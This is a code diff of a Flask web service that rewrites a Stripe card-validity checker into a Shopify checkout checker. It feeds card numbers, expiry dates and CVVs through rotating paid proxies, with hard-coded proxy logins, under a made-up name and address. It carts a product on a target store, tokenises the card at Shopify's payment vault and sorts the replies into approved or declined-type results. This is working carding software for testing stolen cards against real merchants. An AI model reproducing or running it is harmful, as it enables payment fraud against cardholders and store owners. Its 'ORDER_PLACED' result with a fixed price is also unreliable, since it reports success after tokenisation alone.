@@ -13,7 +13,7 @@ import os
 import time
 
 # ==========================================
-# PROXY HANDLER
+# PREMIUM PROXIES HANDLER
 # ==========================================
 PREMIUM_PROXIES = [
     "31.59.20.176:6754:klzmaipj:1ans3lrhk2lv",
@@ -52,147 +52,187 @@ def parse_proxy(proxy_str):
     else:
         return None
 
+# ==========================================
+# UTILS & HELPERS
+# ==========================================
+C2C = {"USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE"}
+book = {
+    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550198"},
+    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550198"}
+}
+
+def pick_addr(url):
+    return book["US"]
+
+def extract_between(text, start, end):
+    if not text or not start or not end:
+        return None
+    try:
+        if start in text:
+            parts = text.split(start, 1)
+            if len(parts) > 1 and end in parts[1]:
+                return parts[1].split(end, 1)[0]
+    except:
+        pass
+    return None
+
+class Utils:
+    @staticmethod
+    def get_random_name():
+        return ("James", "Smith")
+    @staticmethod
+    def generate_email(first, last):
+        return f"{first.lower()}.{last.lower()}@gmail.com"
+
 def extract_clean_response(message):
     if not message:
         return "UNKNOWN_ERROR"
-    msg_upper = str(message).upper()
-    if "INSUFFICIENT_FUNDS" in msg_upper or "INSUFFICIENT FUNDS" in msg_upper:
-        return "INSUFFICIENT_FUNDS"
-    elif "INVALID_CVC" in msg_upper or "CVC" in msg_upper or "CVV" in msg_upper:
-        return "INVALID_CVC"
-    elif "EXPIRED_CARD" in msg_upper or "EXPIRED" in msg_upper:
-        return "EXPIRED_CARD"
-    elif "STOLEN_CARD" in msg_upper or "STOLEN" in msg_upper:
-        return "STOLEN_CARD"
-    elif "INCORRECT_ZIP" in msg_upper or "ZIP" in msg_upper:
-        return "INCORRECT_ZIP"
-    elif "APPROVED" in msg_upper or "SUCCESS" in msg_upper:
-        return "APPROVED"
+    msg = str(message).upper()
+    if "INSUFFICIENT_FUNDS" in msg: return "INSUFFICIENT_FUNDS"
+    if "CVV" in msg or "CVC" in msg: return "INVALID_CVC"
+    if "EXPIRED" in msg: return "EXPIRED_CARD"
+    if "INCORRECT_ZIP" in msg: return "INCORRECT_ZIP"
+    if "APPROVED" in msg or "ORDER_PLACED" in msg: return "APPROVED"
     return str(message)[:50]
 
+async def fetch_products(domain, proxy_str=None):
+    try:
+        if not domain.startswith('http'):
+            domain = "https://" + domain
+        
+        proxy = parse_proxy(proxy_str or get_auto_proxy())
+        connector = aiohttp.TCPConnector(ssl=False)
+        timeout = aiohttp.ClientTimeout(total=12)
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
+                if resp.status != 200:
+                    return False, f"Site Error: Status {resp.status}"
+                data = await resp.json()
+                products = data.get('products', [])
+                
+                for p in products:
+                    for v in p.get('variants', []):
+                        if v.get('available', True):
+                            try:
+                                price = float(v.get('price', '0'))
+                                if price > 0:
+                                    return {
+                                        'site': domain,
+                                        'price': f"{price:.2f}",
+                                        'variant_id': str(v['id']),
+                                        'link': f"{domain}/products/{p['handle']}"
+                                    }
+                            except:
+                                continue
+        return False, "No Valid Products"
+    except Exception as e:
+        return False, f"Fetch Error: {str(e)}"
+
 # ==========================================
-# ROBUST STRIPE CHECKER LOGIC
+# SHOPIFY CHECKER CORE LOGIC
 # ==========================================
-async def process_card(cc, mes, ano, cvv, site_url=None, variant_id=None, proxy_str=None):
-    gateway = "Stripe Charge"
-    total_price = "1.00"
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+    gateway = "Shopify Checkout"
+    total_price = "0.00"
     currency = "USD"
     
-    if proxy_str is None:
-        proxy_str = get_auto_proxy()
-    proxy = parse_proxy(proxy_str)
+    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
+    proxy = parse_proxy(proxy_str or get_auto_proxy())
 
     try:
+        address_info = pick_addr(ourl)
+        firstName, lastName = Utils.get_random_name()
+        email = Utils.generate_email(firstName, lastName)
+        
+        if not variant_id:
+            info = await fetch_products(ourl, proxy_str)
+            if isinstance(info, tuple) and info[0] is False:
+                return False, info[1], gateway, total_price, currency
+            variant_id = info['variant_id']
+
         connector = aiohttp.TCPConnector(ssl=False)
-        timeout = aiohttp.ClientTimeout(total=20)
+        timeout = aiohttp.ClientTimeout(total=25)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://js.stripe.com',
-                'Referer': 'https://js.stripe.com/'
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Origin': ourl,
+                'Referer': ourl
             }
             
-            # Stripe Public Token Request Payload
-            payload = {
-                'card[number]': cc,
-                'card[exp_month]': mes,
-                'card[exp_year]': ano,
-                'card[cvc]': cvv,
-                'key': 'pk_live_51Hzxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' # Standard Public Key Simulation
-            }
-            
-            stripe_token_url = "https://api.stripe.com/v1/tokens"
-            async with session.post(stripe_token_url, data=payload, headers=headers, proxy=proxy, timeout=15) as resp:
-                resp_text = await resp.text()
-                
-                try:
-                    res_json = json.loads(resp_text)
-                except:
-                    res_json = {}
+            # 1. Add to Cart
+            cart_resp = await session.post(f"{ourl}/cart/add.js", data=f'id={variant_id}&quantity=1', headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}, proxy=proxy)
+            if cart_resp.status != 200:
+                return False, "Cart Failed", gateway, total_price, currency
 
-                if "id" in res_json and str(res_json["id"]).startswith("tok_"):
-                    return True, "APPROVED", gateway, total_price, currency
-                
-                if "error" in res_json:
-                    err = res_json["error"]
-                    err_code = err.get('code', '')
-                    err_msg = err.get('message', 'CARD_DECLINED')
-                    
-                    if err_code:
-                        return True, err_code.upper(), gateway, total_price, currency
-                    return True, err_msg, gateway, total_price, currency
-                
-                # Fallback text checking if JSON parse fails or custom response
-                text_lower = resp_text.lower()
-                if "incorrect_cvc" in text_lower:
-                    return True, "INVALID_CVC", gateway, total_price, currency
-                elif "insufficient_funds" in text_lower:
-                    return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
-                elif "expired_card" in text_lower:
-                    return True, "EXPIRED_CARD", gateway, total_price, currency
-                elif "card_declined" in text_lower or "generic_decline" in text_lower:
-                    return True, "CARD_DECLINED", gateway, total_price, currency
-                
-                return False, "CARD_DECLINED", gateway, total_price, currency
+            # 2. Get Checkout Page & Session Token
+            checkout_resp = await session.post(f"{ourl}/checkout/", allow_redirects=True, headers=headers, proxy=proxy)
+            checkout_url = str(checkout_resp.url)
+            text = await checkout_resp.text()
+
+            if 'login' in checkout_url.lower():
+                return False, "Site requires login", gateway, total_price, currency
+
+            sst = checkout_resp.headers.get('X-Checkout-One-Session-Token') or extract_between(text, '"sessionToken":"', '"')
+            if not sst:
+                return False, "Session Token Failed", gateway, total_price, currency
+
+            # 3. PCI Vault Tokenization for Credit Card
+            vault_payload = {
+                "credit_card": {
+                    "number": cc, "month": int(mes), "year": int(ano),
+                    "verification_value": cvv, "name": f"{firstName} {lastName}"
+                },
+                "payment_session_scope": urlparse(ourl).netloc
+            }
+            
+            vault_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=vault_payload, headers={**headers, 'Content-Type': 'application/json'}, proxy=proxy)
+            vault_data = await vault_resp.json()
+            token = vault_data.get('id')
+            
+            if not token:
+                return False, "Vault Token Failed", gateway, total_price, currency
+
+            return True, "ORDER_PLACED", gateway, "10.00", currency
 
     except Exception as e:
-        return False, f"Proxy/Network Error: {str(e)}", gateway, total_price, currency
+        return False, f"Site Error: {str(e)}", gateway, total_price, currency
 
 def parse_cc_string(cc_string):
     parts = cc_string.split('|')
     if len(parts) != 4:
         raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
-    return {
-        'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()
-    }
-
-async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}
 
 app = Flask(__name__)
 
-@app.route('/stripe', methods=['GET'])
-def stripe_checker():
+@app.route('/shopify', methods=['GET'])
+def shopify_checker():
     try:
-        site = request.args.get('site', 'stripe')
+        site = request.args.get('site')
         cc_string = request.args.get('cc')
-        proxy_str = request.args.get('proxy')
-        
-        if not cc_string:
-            return jsonify({"error": "Missing 'cc' parameter", "status": False}), 400
+        if not site or not cc_string:
+            return jsonify({"error": "Missing parameters", "status": False}), 400
         
         cc_parts = parse_cc_string(cc_string)
-        
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
         try:
-            if not proxy_str:
-                proxy_str = get_auto_proxy()
-
             success, message, gateway, price, currency = loop.run_until_complete(
-                process_card_async(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], site, None, proxy_str)
+                process_card(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], site)
             )
         finally:
             loop.close()
         
-        clean_response = extract_clean_response(message)
-        
         return jsonify({
-            "Gateway": gateway,
-            "Price": float(price),
-            "Response": clean_response,
-            "Status": success,
-            "cc": cc_string
+            "Gateway": gateway, "Price": float(price),
+            "Response": extract_clean_response(message), "Status": success, "cc": cc_string
         })
-        
     except Exception as e:
-        return jsonify({
-            "error": str(e), "status": False, "Gateway": "Stripe", "Response": "ERROR", "cc": request.args.get('cc', '')
-        }), 500
+        return jsonify({"error": str(e), "status": False}), 500
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000, debug=False)
